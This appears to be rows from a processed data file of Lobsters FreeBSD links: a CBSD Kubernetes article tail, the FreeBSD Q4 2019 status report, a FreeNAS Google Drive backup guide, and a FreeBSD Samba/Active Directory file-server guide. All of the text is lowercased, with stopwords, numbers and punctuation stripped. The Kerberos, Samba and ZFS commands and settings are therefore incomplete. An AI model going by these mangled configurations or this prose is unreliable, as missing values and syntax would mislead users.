immediately execute kubectl get node command make sure everything place cluster ready go test apply sample official documentation run first container new cluster delete cluster argument either delete standard cbsd bremove command also reset cluster setting without destroying virtual machine enjoy small podcast demo article youtube http context dynamically developing industry extremely important automate possible operation get result soon possible value time nerve use limited valuable resource accomplish task article demonstrates collaboration number technology freebsd linux zfs cloudinit bhyve cbsd used one thing raise readytouse kubernetes cluster configuration quickly possible obviously longest step configuresetup also optimized since step performs various action work remote resource wget yaml configuration calico etc also included cloud image kubernetes future also seems like interesting idea able combine several physical server freebsdcbsd via vxlan creating single segment container using ceph nfs object storage also right exist organizing single disk space container different physical node also proper refinement get freebsd zfsbased fault tolerance scalable kubernetes cluster form black box black box mean closed mean result framework require specialist immerse freebsd bhyve cbsd technology get universal api controlling managing cluster final product anyone interested freebsd bhyve kubernetes want run saas service resource using cbsd write idea comment would interesting provide public simple cheap way operation
169,Lobsters,freebsd,FreeBSD,FreeBSD Status Report 2019 Q4,https://www.freebsd.org/news/status/report-2019-10-2019-12.html,freebsd status report,introduction administration page core freebsdorg deb freebsdfoundationorg partnership commercial user support fundraising effort making donation o improvement continuous integration quality assurance freebsd hardware testing lab review ci testing advancement supporting freebsd infrastructure freebsd advocacy education legalfreebsd ip freebsdorg clusteradm freebsdorg jenkinsadmin freebsdorg lwhsu freebsdorg weekly ci report freebsd hardware testing lab pdk semihalfcom mw semihalfcom section rmacklem freebsdorg manu freebsdorg freebsdarm freebsdorg manu freebsdorg mmel freebsdorg gonzo freebsdorg gonzo freebsdorg bsdic microsoftcom whu freebsdorg lwhsu freebsdorg azure cperciva freebsdorg mk semihalfcom mba semihalfcom mw semihalfcom jhibbits freebsdorg bdragon freebsdorg alfredojunior eldoradoorgbr mw semihalfcom ar semihalfcom nxp soc trasz freebsdorg freebsd continuous integration infrastructure extended attribute support fexecve syscall sendfile failing ltp test portmgrsecretary freebsdorg portmgr freebsdorg kde freebsdorg http kdenliveorg open bug list copy port repository glewis freebsdorg tagattie yandexcom pizzamig freebsdorg christeredwards gmailcom bastille status upt framalistesorg uptpackaging http rubygemsorg gerald freebsdorg alfonsosiciliano emailcom pizzamig freebsdorg estebanbarrios trivagocom mike opsfactorycomau info nomadbsdorg news home status home,introductionhere last quarterly status report might remember last report changed timeline collect report last month quarter edit publish full document next month thus cover period october december thought freebsd community le active christmas quarter glad proven wrong quick glance summary sufficient see much work done last monthshave nice read lorenzo salvadoreentries various official semiofficial team found administration page contact freebsd core team core freebsdorg freebsd core team governing body freebsd julie saravanos sister bruce evans bde mailed core sad news bruce passed away age year bruce deeply respected member community served core team made commits bruce impact culture profound new terminology spawned excerpt message poulhenning kamp julie nt know precisely first communicated bruce late via usenet say certainty people inspired improved programming bruce next half life large project invent vocabulary freebsd two neologism brucification brucified brucification meant receiving short courteous note pointing sometimes subtle deficiency overlooked detail source code change necessarily serious problem possibly even problem anybody nonetheless something wrong ought fixed uncommon critique considerably longer change question one ignored brucifications one ran risk brucified meant receiving long painstakingly detailed list every single one error mistake typo shortcoming bad decision questionable choice style transgression general sloppiness thinking often expressed deadpan humor sharpened nearfatal point frustrating thing bruce would perfectly justified correct recall one two case able respond sorry bruce wrong confess rare day felt like cut notch keyboard last email received bruce good example depth knowledge insight provided project http docsfreebsdorgcgigetmsgcgi release dedicated another freebsd developer passed away fourth quarter kurt lidl freebsd foundation memorial page kurt http wwwfreebsdfoundationorgbloginmemoryofkurtlidl send condolence family bruce kurt core documented project policy support tier http core approved source commit bit james clarke brook davis brook mentor james john baldwin jhb comentor project first season doc ended negative result work completed contact could established writer payment made financing set aside future work google summer code completed information seven accepted project found wiki page http adam weinberger adamw added conduct adam demonstrated competence understanding fairness personal matter liwen hsu lwhsu contacted core receiving report concerned local community member past update project internationalization policy lengthy discussion took place determine reaffirm project maintains neutral position political dispute update made document decided future change would require explicit core approval http nomination edward napierała trasz core voted grant daniel ebdrup debdrup lorenzo salvadore salvadore membership project daniel lorenzo working quarterly report past quarter coreinitiated git transition working group continued meet last quarter report still forthcoming contact deb goodkin deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage software development project conference developer summit provide travel grant freebsd contributor foundation purchase support hardware improve maintain freebsd infrastructure provides resource improve security quality assurance release engineering effort publishes marketing material promote educate advocate freebsd project facilitates collaboration commercial vendor freebsd developer finally represents freebsd project executing contract license agreement legal arrangement require recognized legal entity highlight help freebsd last quarter partnership commercial user support help facilitate collaboration commercial user freebsd developer also meet company discus need bring information back project ed maste deb goodkin met commercial user u beneficial also help u understand application freebsd used also able meet good number commercial user bay area vendordeveloper summit open source summit europe venue provide excellent opportunity meet commercial individual user contributor freebsd fundraising effort focused supporting key area project needed help first area software development whether contracting freebsd developer work project like wifi support providing internal staff quickly implement hardware workarounds stepped help keep freebsd innovative secure reliable software development includes supporting tool infrastructure make development process go smoothly team member heading continuous integration effort actively involved clusteradmin security team advocacy effort focused recruiting new user contributor project attended participated conference event country giving freebsd presentation workshop staffing table able conversation thousand attendee travel also provided opportunity talk directly freebsd commercial individual user contributor future freebsd userscontributors seen increase use interest freebsd organization individual meeting give u chance learn organization need individual working information help inform work fund donation helped u continue effort supporting critical area freebsd operating system improvement providing staff immediately respond urgent problem implement new feature functionality allowing innovation stability come rely improving increasing test coverage continuous integration automated testing fulltime software engineer ensure receive highest quality secure reliable operating system security providing engineering resource bolster capacity responsiveness security team providing peace mind security issue arise growing number freebsd contributor user global freebsd outreach advocacy effort including expanding region china india africa singapore offering freebsd workshop presentation conference meetups university around world providing opportunity developer vendor summit company visit help facilitate collaboration commercial user freebsd developer well helping get change pushed freebsd source tree creating bigger healthier ecosystem accomplished lot year still small c organization focused supporting freebsd trade organization like many open source foundation please consider making donation http wwwfreebsdfoundationorgdonate help u continue increase support freebsd also partnership program provide benefit larger commercial donor find information http wwwfreebsdfoundationorgfreebsdfoundationpartnershipprogram share company o improvement foundation support software development project improve freebsd full time technical staff contractor project grant recipient maintain improve critical kernel subsystem add new feature functionality fix bug october december commits freebsd source repository tagged freebsd foundation sponsorship commits period project entry quarterly report repeated others briefly described usual foundation staff member konstantin belousov committed large number ufs nfs tmpfs vm system lowlevel intel bug fix improvement kostik also committed improvement runtime linker rtld participated many code review helping get change developer integrated tree following work improve debugging tool linuxulator environment edward napierała integrated linux test project ltp freebsd ci system committed number small bug fix linuxulator mark johnston continued working infrastructure syzkaller system call fuzzing tool committed fix many issue identified mark committed improvement riscv infrastructure network stack performance locking pmap mark also added support newer intel wifi chipsets iwm driver enabling wifi support lenovo carbon generation contemporary laptop ed maste committed number improvement cleanup build infrastructure vt console fix including issue keyboard map blacklistd update documentation update small change ed also committed work prepare removal gcc freebsd source tree currently planned continuous integration quality assurance foundation provides fulltime staff member working improving automated testing continuous integration overall quality assurance effort fourth quarter foundation staff continued improve project ci infrastructure worked contributor fix failing build test case worked team project testing need also worked many external project company improve support freebsd added several new ci job brought freebsd hardware testing lab online published review ci testing advancement foundation blog see freebsd ci section report completed work item detailed information supporting freebsd infrastructure foundation provides hardware support improve freebsd infrastructure last quarter continued supporting freebsd hardware located around world freebsd advocacy education large part effort dedicated advocating project includes promoting work done others freebsd producing advocacy literature teach people freebsd help make path starting using freebsd contributing project easier attending helping freebsd contributor volunteer run freebsd event staff freebsd table give freebsd presentation freebsd foundation sponsor many conference event summit around globe event bsdrelated open source technology event geared towards underrepresented group support freebsdfocused event help provide venue sharing knowledge work together project facilitate collaboration developer commercial user help provide healthy ecosystem support nonfreebsd event promote raise awareness freebsd increase use freebsd different application recruit contributor project check advocacy education work last quarter organized bay area freebsd vendor developer summit santa clara ca presented coscon shanghai china represented freebsd thing open raleigh north carolina industry partner sponsor lisa portland silver sponsor openzfs san francisco ca gave technical presentation school mine golden co presenting representing freebsd seagl seattle wa presented open source summit europe lyon france committed sponsoring linuxconfau gold coast australia addition holding freebsd miniconf accepted present bsd dev room fosdem brussels belgium accepted stand fosdem brussels belgium committed sponsoring fossasia singapore committed hold freebsd day scale pasadena ca continued producing freebsd advocacy material help people promote freebsd learn effort advocate freebsd http face freebsd series back check latest post mahdi mokhtari http read conference adventure conference recap trip report monthly newsletter http wwwfreebsdfoundationorgnewsandeventsnewsletter help educate world freebsd publishing professionally produced freebsd journal mentioned previously freebsd journal free publication find access latest issue http wwwfreebsdfoundationorgjournal find event attended upcoming event http wwwfreebsdfoundationorgnewsandevents continued work new website developer help u improve website work begun make easier community member find information easily make site efficient legalfreebsd ip foundation owns freebsd trademark responsibility protect also provide legal support core team investigate question arise go http wwwfreebsdfoundationorg find support freebsd help contact freebsd release engineering team freebsdorg freebsd release engineering team responsible setting publishing release schedule official project release freebsd announcing code freeze maintaining respective branch among thing freebsd release engineering team continued work started september release cycle first freezeless release subversion repository test bed eliminating requirement hard code freeze development branch cycle concluded final build beginning november preceded three beta build two rc build build included original schedule decided required additionally throughout quarter several development snapshot build released head branch much work sponsored rubicon communication llc netgatecom freebsd foundation contact cluster administration team clusteradm freebsdorg freebsd cluster administration team consists people responsible administering machine project relies distributed work communication synchronised quarter team worked following upgrade freebsdorg ongoing system administration work creating account new committers backup critical infrastructure keeping security update party software work progress review service jail service administrator operation south africa mirror jinx progress nvme issue blocking dual socket machine used pkg builder drive upgrade test pkg builder ssds courtesy freebsd foundation boot issue reference machine new nyinet sponsored colocation space chicagoland area setup new host ci staging environment plan add new semiofficial pkg mirror contact jenkins admin jenkinsadmin freebsdorg contact liwen hsu lwhsu freebsdorg freebsd ci team maintains continuous integration system related task freebsd project ci system regularly check committed change successfully built performs various test analysis result result build job archived artifact server testing debugging need ci team member examine failing build unstable test work expert area fix code adjust test infrastructure detail effort available weekly ci report fourth quarter worked contributor developer project testing need also worked many external project company improve support freebsd freebsd hardware testing lab online quarter still work progress stage merging different version integrate tightly main ci server also working make work easierly reproduced work progress collecting sorting ci task idea http setup ci stage environment put experimental job implementing automatic test bare metal hardware adding drm port building test current testing merging pull request http githubcomfreebsdfreebsdcipulls planning running ztest network stack test helping software get ci freebsd hosted ci solution adding ltp test job adding test job adding external toolchin related job please see freebsdtesting related ticket wip information project sponsored freebsd foundationprojects span multiple category kernel userspace port collection external project contact patryk duda pdk semihalfcom contact marcin wojtas mw semihalfcom extended sequence number esn ipsec extension defined section make possible implement highspeed ipsec implementation standard sequence number sufficent key feature esn low order bit sequence number transmitted wire highorder bit maintained sender receiver additionally highorder bit included computation integrity check value icv field extended sequence number support contains following modification existing antireplay algorithm fulfil esn requirement trigger soft lifetime expiration esn disabled implement support including esn icv cryptosoft engine encrypt authenticate mode eg aescbc hmac combined mode eg aesgcm implement support including esn icv aesni engine encrypt authenticate mode combined mode remaining work upstream patch antireplay algorithm adjust implementation crypto part reworked open crypto framework get stable project sponsored stormshield contact rick macklem rmacklem freebsdorg describes new minor revision nfs version protocol project implement new minor revision nfs version minorversion protocol add several optional feature nfs support seekdataseekhole file copying done server avoids data transfer wire support posixfallocate posixfadvise hopefully feature improve performance certain application project basically completed code change committed headcurrent released freebsd testing others would appreciated testing date headcurrent system required client mount need mount option enable protocol nfs server enabled default contact emmanuel vadot manu freebsdorg dts file device tree source updated par linux head branch dts riscv architecture imported well contact freebsdarm freebsdorg contact emmanuel vadot manu freebsdorg contact michal meloun mmel freebsdorg rockchip support configuration device mode still supported however host mode work board support spi committed enables ability interact spi flash present regulator pmic power management ic added clock supported completes clock reset implementation previously clock device driver supported tsadc temperature sensor adc supported add ability read temperature cpu gpu via sysctl hwtemperature initial pcie support committed verified working several different board known working device nvme device pcie card nt utilize pcie switching bridge functionality card detection sdcard supported still problem board using gpio cd instead internal detection mechanism contact oleksandr tymoshenko gonzo freebsdorg ovum file format packaging distributing virtual appliance preconfigured virtual machine image virtual appliance file contains full vm information like number cpu amount memory list virtual device also includes disk image application like virtualbox vmware import ovum file process easily automated freebsdmkova cli tool create ovum file using vmdk image provided freebsd limited set attribute specified vm name number cpu amount memory disk size tool also cursory sanity check vmdk file format assuming monolithic sparse file converted streamoptimized format script extended make hardware configuration flexible vmdk parser robust update kernel subsystemsfeatures driver support filesystems contact oleksandr tymoshenko gonzo freebsdorg modern socs devboards audio support one form another one area overlooked freebsd driver developer common architecture audio pipeline singleboard computer consists two dais digital audio interface cpu codec connected serial bus cpu dai soc ip block operates sample obtains driver playback provides driver recording fifo dma request audio sample leave arrive soc serial bus usually connected codec dai codec dai external soc chip pack one dacadc block along mixer amplifier probably specialized device like filter andor sound effect analog part codec connected microphonesheadphonesspeakers sbcs codec usually communicates soc two interface data path audio sample travel control interface used readwrite chip register configure behavior common choice bus respectively fdtenabled device audio pipeline described virtual dtb node link cpu codec device specifies data format clock detail cpu codec chip would use also may one cpucodec pair using test device able implement driver soc pio mode playback driver realtek chip headphone playback mixer control base outline soc audio framework bit framework ported netbsd code developed jared mcneill wip branch play audio control playback volume primary missing functionality moment recording support multilink audio card dma support critical among dma support current implementation buffer management placed ausoc layer going work dma cpu dai driver would know memory constraint access mechanism current state support allow implement dma transfer easily plan look right adding recording support lot work contact freebsd integration service team bsdic microsoftcom contact wei hu whu freebsdorg contact liwen hsu lwhsu freebsdorg wei working hyperv socket support freebsd hyperv socket provides way host guest communicate using common socket interface without networking support feature azure require hyperv socket support guest planned commit code end february project sponsored microsoft detail hyperv socket available http docsmicrosoftcomenusvirtualizationhypervonwindowsuserguidemakeintegrationservice liwen wei working improving freebsd release azure quarter wei published azure liwen working freebsd release code related azure current branch project sponsored microsoft freebsd foundation contact colin percival cperciva freebsdorg november amazon web service announced first elastic compute cloud instance built around platform freebsd supported platform running specific virtual machine took additional work april weekly snapshot build performed release engineering team included amis freebsd head november freebsd released including first release freebsd amis week later added new product aws marketplace invent conference december amazon announced second family instance known variously graviton far powerful firstgeneration instance roughly priceperformance advantage family instance existing freebsd head amis run box instance work currently underway improve kernel locking scalability instance high level parallelism eg buildworld instance approximately higher sys user ratio equallysized instance suggesting room improvement two issue recently identified likely relating acpi stopinstance api call translate acpi power button notification trigger freebsd shut result timeout hard poweroff hotpluggingunplugging eb volume normally operates via acpi device notification work help developer familiar acpi would much appreciated project sponsored patreon contact michal krawczyk mk semihalfcom contact maciej bielski mba semihalfcom contact marcin wojtas mw semihalfcom ena elastic network adapter smart nic available virtualized environment amazon web service aws ena driver support multiple transmit receive queue handle gb network traffic depending instance type used completed since last update upstream driver version introducing netmap support driver structure rework split datapath code initialization fix keepalive timeout due prolonged reset enable llq mode instance enabling memory mapped wc work progress ena release introducing new bug fix feature improvement project sponsored amazoncom incupdating platformspecific feature bringing support new hardware platform contact justin hibbits jhibbits freebsdorg contact brandon bergren bdragon freebsdorg contact alfredo dalava júnior alfredojunior eldoradoorgbr shortly end year powerpc target powerpc powerpcspe switched clang base compiler effort spanning nearly full year several people involved powerpc platform powerpc powerpcspe still require gnu ld us lld base linker two platform migrate soon lld ready next several month switch clang lld also switched modern abi initially targeted linux little endian abi endian agnostic however binary incompatible freebsd still big endian powerpc target contact marcin wojtas mw semihalfcom contact artur rojek ar semihalfcom semihalf team initiated working freebsd support nxp soc quadcore processor integrated packet processing acceleration high speed peripheral including gb ethernet pcie sata usb wide range networking storage security industrial application completed since last update qspi network performance improvement todo upstreaming developed feature work expected submittedmerged head project sponsored alstom groupchanges affecting base system program contact edward tomasz napierala trasz freebsdorg linux binary linux test project test part freebsd continuous integration infrastructure make easy track progress improving linux compatibility layer detect regression fair number kind improvement layer ranging updated linux man page new linux rc script take care eg mounting linuxspecific filesystems setting elf fallback brand new syscalls tiny improvement making work linux binary user point view running linux jail mostly working state ssh jail centos binary run screen emacs postgres openjdk use yum upgrade course still bunch thing need work patch chuck make core dump work linux binary make debugging much easier pending review patch add extended attribute support fexecve syscall sendfile require wrapping committing failing ltp test false positive easy fix bug require adding new system call help welcome project sponsored freebsd foundationchanges affecting port collection whether sweeping change touch tree individual port contact rené ladan portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg port management team responsible overseeing overall direction port tree building package personnel matter entry show happened last quarter closed total port open pr small pr unassigned last quarter saw commits committers head branch commits committers branch seems suggest small increase activity compared quarter last quarter welcomed oleksii alex samorukov samm scott long scottl already source committer new port committers also said goodbye az brd dtekse eadler johans default version port changed lazarus version samba python web browser received update chromium version firefox version esr counterpart version finally qt stack got updated version modernization took place palm category removed well virtual category support next considered norm lastly centos port removed centos counterpart made default previous quarter always antoine happy take expruns time total various port framework update default version update removal openjdk openjre contact adriaan de groot kde freebsdorg kde freebsd project package software produced kde community freebsd software includes full desktop environment art application http kdenliveorg hundred application used freebsd desktop machine monthly release kde framework bugfixreleases kde plasma desktop quarterly feature release kde plasma desktop landed port tree shortly upstream release also monthly kde application bugfixreleases also landed timely manner digikam landed new release thanks dima panov hope get rid instability caused previous release update last quarter open bug list grew quarter handful strange build failure welcome detailed bug report patch kde packaging update prepared copy port repository github merged svn welcome pull request well contact greg lewis glewis freebsdorg freebsd java porting effort feature smaller update previous quarter however following change worth mentioning updated port openjdk removal eoled java port fixed remote debugging java fixed problem running external process java project sponsored freebsd foundation contact hiroki tagato tagattie yandexcom contact luca pizzamiglio pizzamig freebsdorg electron popular framework build desktop application using javascript html cs month ago electronjs added port tree currently version supported last quarter popular application powerful vscode editor added port tree well vscode based electron atom another popular editor still work progress based electron many thanks hiroki hard work antoine support special poudriere configuration needed build vscode contact christer edward christeredwards gmailcom bastille bastille opensource system automating deployment management containerized application freebsd bastille us freebsd jail container platform add template automation create dockerlike collection containerized software template collection currently validates application port tree growing template take care installing configuring enabling starting software providing automated way building containerized stack bastille available port sysutilsbastille status bastille published three release total ten release highlight update include support thin shared base thick unique base jail support include fstab template system upgrade support shared unique base jail gitlab cicd testing official template automatic template validation cve scan dedicated pf table private ip jail bastille saw increase community contribution six new github contributor people generously improved error checking release validation firewall functionality flexible networking initial support resource limit want thank everyone contributed bastille support amazing contact upt mailing list upt framalistesorg contact uptpackaging universal package manager upt tool designed easily port software common upstream package archive http rubygemsorg various operating system including freebsd course lot similar tool already exist pytoport creates freebsd port pypi package creates debian package ruby gem many others main difference tool upt latter us modular design allowing handle package many source support many different operating system plugins may try upt installing sysutilspyupt sysutilspyuptpypi sysutilspyuptfreebsd suppose would like package uptcran hosted pypi could like upt package f pypi b freebsd usrportssysutils uptcran tree usrportssysutilspyuptcran usrportssysutilspyuptcran makefile distinfo pkgdescr cat sysutilspyuptcranmakefile freebsd trasz portname uptcran distversion category sysutils python mastersites cheeseshop pkgnameprefix pythonpkgnameprefix maintainer python freebsdorg comment cran frontend upt license licensefile wrksrc xxx rundepends pythonpkgnameprefix lxml develpylxml pyflavor pythonpkgnameprefix request wwwpyrequests pyflavor pythonpkgnameprefix upt sysutilspyupt pyflavor testdepends pythonpkgnameprefix requestsmock wwwpyrequestsmock pyflavor us python usepython autoplist distutils include bsdportmk note rubygems cpan frontends also available sysutilspyuptrubygems sysutilspyuptcpan bug report comment new tool welcome contact gerald pfeifer gerald freebsdorg lot happened since last quarterly report wine release series tree nearly year proven rather stable port winedevel track biweekly development release seen regular adjustment infrastructure change small improvement particular also around nondefault option need help wine wine allows running window application one installation volunteer proposed make work expertise facility properly review test maintain facilitate getting least one tree please help like assume comaintainership sole maintainership emulatorswine option many project build upon freebsd incorporate component freebsd project project may interest broader freebsd community sometimes include brief update submitted project quarterly report freebsd project make representation accuracy veracity claim submission contact alfonso sabato siciliano alfonsosiciliano emailcom freebsd kernel maintains management information base mib component object represents parameter system sysctl system call explores mib find object object identifier oid call handler get set value parameter sysctlbyname syscall old function accepts name object instead oid identify purpose project allow sysctlbyname handle ctltypenode nonull handler example kernprocpid pid object levelname equal character example securityjailparamallowmount sysctlbyname clone provided sysctlbynameimproved implementation core new sysctl internal node get oid node name eventually expanded input handler installed via sysutilssysctlbynameimprovedkmod internal node also used sysctlmifoidinputbyname function userland library handled sysctlinfobyname macro sysctlinfo interface described previous quarterly status report contact luca pizzamiglio pizzamig freebsdorg contact esteban barrio estebanbarrios trivagocom pot utility added support private bridge group jail use dedicated bridge instead public one improving isolation moreover several small bug found fixed support prepost startstop hook script added nomad pot driver received support nomad restart without drain improved configuration stability new port called minipot added port install configuration file dependency converting freebsd machine single node cluster install nomad consul pot nomad pot driver traefik already configured ready use experimental work done tool allows create run pot image freebsd jail operating system linux mac adopting approach similar docker machine hope make tool available soon next step add dual ip stack support pot add private bridge support nomad pot driver improve usability create image project sponsored trivago nv contact michael crilly mike opsfactorycomau day challenge educational initiative help people onboard freebsd easily use combination tutorial guide howtos get user engaged freebsd quickly target specific end goal user might freebsd primary objective demonstrate freebsd capability modern relevant operating system today cloud centric automated business model project sponsored opsfactory pty ltd australia contact nomadbsd team info nomadbsdorg nomadbsd persistent live system usb flash drive based freebsd together automatic hardware detection setup configured used desktop system work box also used data recovery educational purpose testing freebsd hardware compatibility one release candidate nomadbsd team finished released nomadbsd december release based freebsd fixed lot bug added new package feature along feature option install nomadbsd zfs use automatic configuration running nomadbsd virtualbox new tool developed nomadbsd team added version nomadbsddmconfig select display manager theme nomadbsdadduser add new user account dsbbg change background image using qttoolkit added two mirror france germany would like thank nosheepfr faude looking people help project help much appreciated area translation program interface design artwork programming new tool extend existing one test bug report ux feature suggestion mirror outside europe open task support installation disk partition add partition editor gui complete disk encryption add userfriendly network manager news home status home
170,Lobsters,freebsd,FreeBSD,How To Back Up Google Drive to FreeNAS,https://www.ixsystems.com/blog/backup-google-drive-to-freenas/,back google drive freenas,back google drive freenas blog freenas,back google drive freenas jan blog freenas google drive g suite widely used tool creating sharing document spreadsheet presentation team member cloudbased tool inherent backup replication included cloud provider certain user may require additional backup archive capability example company using g suite important work may required keep record year potentially beyond scope g suite subscription freenas truenas offer ability back google drive easily using builtin cloud sync blog explain set google drive sync freenas well provide caveat workarounds backing google doc google created content setting google drive credential set credential system cloud credential click login provider login appropriate google user account google request allow access google drive file freenas device allow access appropriate access key inserted freenas access token assign team id required necessary case click verify credential successful click save new cloud credential visible web interface set cloud sync task go task cloud sync task set backup time frame frequency folder cloudbased folder freenas dataset set whether synchronization sync change copy new file move file remove file cloud source freenas source depending push pull add description task select cloud credential choose appropriate cloud folder target freenas storage location select file transfer mode sync keep file newly created deleted copy copy new file appropriate target ie freenas pull file google drive push file google drive move copy file target delete file source using move user set folder google drive archival move older document folder drive account file would automatically get backed freenas storage created task run designated period time edits made clicking arrow righthand side clicking run prompt task start immediately web interface show status running success upon completion detail accessed via task manager icon upper righthand corner verify success ssh freenas use builtin shell terminal verify file visible file access client pc device needed create share dataset set store cloud sync smb share used example go sharing window share smb click add choose appropriate dataset permission setting create new smb share mounted client file visible working google created content one caveat google doc file created google tool proprietary set permission readwrite characteristic unknown system standard file share file unreadable result allow google created file become readable allow link sharing access file backup ensure user able open file read access make change save another file edits needed note necessary file created using google doc google sheet google slide file require modification share setting truenas freenas perfect storing content including cloudbased content longterm simple sync backup cloud user rest assured data safe unlimited snapshot copyonwrite builtin replication functionality please contact u http wwwixsystemscomcontactus information ixsystems organization
171,Lobsters,freebsd,FreeBSD,Building a FreeBSD File Server,https://www.vmwareblog.org/building-freebsd-file-server/,building freebsd file server,introduction time get work download adduser adminfs wheel reboot root putty root adminfs root su l exit root su root portsnap fetch portsnap extract portsnap fetch portsnap update midnight commander mc mc mc pkg install mc pkg install heimdal etc mc testlocal etcnsswitchconf pkg install etcrcconf file samba man inetd man samba usrlocaletc testlocal test fstest zfs testparm reboot ntpdate insert ntp server ip kinit p adminfs kerberos adminfs klist net ad join adminfs adminfs fstest testlocal wbinfo p wbinfo u wbinfo g getent group getent passwd create configure file system connect smb resource df kh zrootsharedfs zrootsharedfs time move testing sum,introduction recently job faced task develop file server explicitly suited requirement company needle say configuration kind depends infrastructure need drawing personal experience numerous material web came combination freebsdsambaad appropriate combination harmonic addition existing network configuration since enables admins broad range possibility access control windowsbased infrastructure also samba allows apply network resource window client os without additional configuration required moreover freebsd welldocumented since established let move next point article describing possible model process building new test environment concentrating primarily detail configuration mind though must say way suggesting way following configuration presented initial stage minimum requirement necessary get job done purpose one specific situation look useful strategy solve similar task well let get started probably guess previous commentary creation server require much since freebsd resourcehungry reducing hardware footprint created vm esxi host datastore wd black western digital hard disk drive served need perfectly place two hdd vm o storage parameter vm x intel r xeon r cpu x gb ram x tb hdd raw disk x scsi controller type lsi logic sa x cddvd drive x gb lan type vmxnet configuration suggests spend two western digital black hdd size vendor matter much hdds connected vm raw disk let place vm o storage first disk second one serve mirror create virtual zfs raid connect disk scsi controller type lsi logic sa came configuration help cut expense data network resource important furthermore opinion zfs raid supposed keep data secure either way also want use outside software backup well another story another day time get work since covered everything covered time build test environment according following scheme connect hdd esxi host create datastore create vm datastore install freebsd vm install configure necessary service utility introduce server domain create network resource check connection work resource one vm different credential create vm esxi host find question raw disk get one look keep mind start creating raw disk delete default disk since need anymore store vm configuration file disk name datastore created vm case need keep hand speaking experience enhance file server speed vm use datastore singlehandedly next step download image file installing o freebsd latest distributive esxi datastore add image cddvd drive datastore iso file mode newly created vm find important access configuration successful make sure vm internet access cause trouble update installation time since lot material installation freebsd really point giving much attention let narrow crucial moment boot vm proceed installation introductory word choosing optional system component stick minimum port src add rest later need network configuration make sure server work correctly let assign static ip address important assign static ip specifically want server available time frankly something dynamic ip address guarantee dhcp term end worst time ever lose connection network resource want change address already configured server freebsd find properly decline configuration need one need use local network select dns server address case dns setting access outside world write public dns address second dns google server always come aid case also forget working gateway internet access next move disk partition installation zfs one used auto mode quick effective partition letting o decide course ton time spend internet search manually however must assure purpose auto mode enough mentioned fault tolerance purpose create zfs mirror select two physical device add mirror turn mirroring swap partition increase reliability general detail look rest necessary forget however disconnect iso file vm better soon detail finally move configuration server security purpose create account root access right use adduser utility find information utility fill necessary field create user adminfs username add wheel group otherwise able increase right root level also complete task o installation process add another user using o setup wizard interface comfortable use created resource would help created identical account credential ad added admin group necessary communication ad verify whether account working run reboot reboot server log new user since new account added wheel group problem upgrading user root necessary configuring system setting protect network security threat rash action root configuration multiuser mode make work comfortable manage configure server via ssh putty utility connect server remotely able log root user network side default log system new user adminfs however since need root right upgrade user privilege root need root credential using su l command right remain active unless reboot log exit command let install configure additional component make easy create administer server begin port updating already told upgrade privilege root level su command root password furthermore portsnap fetch portsnap extract command fresh recently installed o update port use portsnap fetch portsnap update command following use let install midnight commander mc know well probably one best file manager impress broad range useful option utility mc already installed going use various reason skip stage install mc binary packet trouble running command pkg install mc install configure kerberos work ad pkg install heimdal move etc create file run following command better mc libdefaults defaultrealm testlocal dnslookuprealm true dnslookupkdc true ticketlifetime renewlifetime forwardable yes proxiable true renewable true clockskew realm testlocal kdc adminserver defaultdomain testlocal domainrealms testlocal testlocal testlocal domain name address domain controller replace name written high register help avoid problem configuration edit file name service manager setting etcnsswitchconf remember need extended privilege action want find verify value following line fix accordingly file save change group file winbind passwd file winbind time proceed installation configuration samba pkg install latest version let take one edit etcrcconf file o boot start service necessary samba work add following line file inetdenable yes nmbdenable yes smbdenable yes winbinddenable yes sambaserverenable yes find line man inetd man samba etc move directory usrlocaletc create file following content global workgroup test security domain realm testlocal netbios name fstest server string samba server version v map guest never client lanman auth client plaintext auth domain master local master server min protocol server max protocol client min protocol client max protocol preferred master client signing mandatory dns proxy ldap ssl use sendfile client use spnego yes client auth yes encrypt password yes restrict anonymous usershare allow guest usershare owner socket option tcpnodelay iptoslowdelay idmap config backend tdb idmap config range idmap config test backend rid idmap config test range winbind enum user yes winbind enum group yes winbind use default domain yes winbind nested group yes winbind refresh ticket yes template homedir home u template shell binfalse log file max log size log level map hidden map system map archive map readonly map acl inherit yes store do attribute yes acl group control yes case sensitive nt acl support yes ea support yes zfs comment zfs shared directory path zrootsharedfs write list testlocaldomain admins testlocaldomain user admin user testlocaldomain admins force group domain user read create mode directory mode create mask directory mask available yes browseable yes public guest ok vfs object zfsacl streamsxattr aclxattr mode special acedup merge chown yes testlocal test name domain work group respectively fstest server name zfs name created resource find parameter value check configuration file following command testparm everything alright see error notification reboot extend privilege reboot server install setting make sure configuration successful introduce server enterprise domain check whether everything working fine important continuing configuration perform clock synchronization ntp server particular case ntp service running domain controller use ntpdate insert ntp server ip command clock synchronization necessary correct connection ad run kinit p adminfs command get ticket kerberos adminfs domain account domain admin right need credential one check presence ad certificate klist command net ad join adminfs adminfs account must added domain preliminary state enough right introduce server domain need password everything work fine get response joined fstest realm testlocal wbinfo check winbindd service availability wbinfo u domain user listing wbinfo available domain user group listing getent group available domain local user group listing getent passwd available domain local user password listing create configure file system connect smb resource trust probably want separate future resource working directory o come handy term security mere convenience future order let build separate file system f resource way find detail o disk organization check file name avoid overlap calculate size future file system quoting df kh select appropriate size quota file system frankly actually need file system grow consume resource mind left unchecked surely want keep everything check leave least gb free disk space o way set gb quota file system lose time set parameter zrootsharedfs path zrootsharedfs mount point activate direct access mode acl activate inherited permission mode active data compression make available smb select quota one command zfs create mountpointzrootsharedfs aclmodepassthrough aclinheritpassthrough compressionon sharesmbon zrootsharedfs find info see result zfs get zrootsharedfs change directory owner group chown adminfs domain user zrootsharedfs open full access directory content owner future configure according domain security policy setfacl owner fullset fd allow zrootsharedfs open access directory reading editing content group setfacl group modifyset fd allow zrootsharedfs see result extended option getfacl v zrootsharedfs reboot samba connected service service sambaserver restart information configuring acl setting function given permission able distribute access right directory different task well installation configuration file server finished time move testing order check newly created server see work right enter one test vms move server ip address enter network credential everything ok connect network resource move onto creating necessary directory setting permission testing infrastructure sum anything wrong ever slightest go back check everything try creating deleting copying managing access right file directory one testing vms try thing another vm using different domain user account permission set right forbid user user group editing content necessary however whole different story security measure access right concern right everything ready go well file server go hope help save time effort good luck
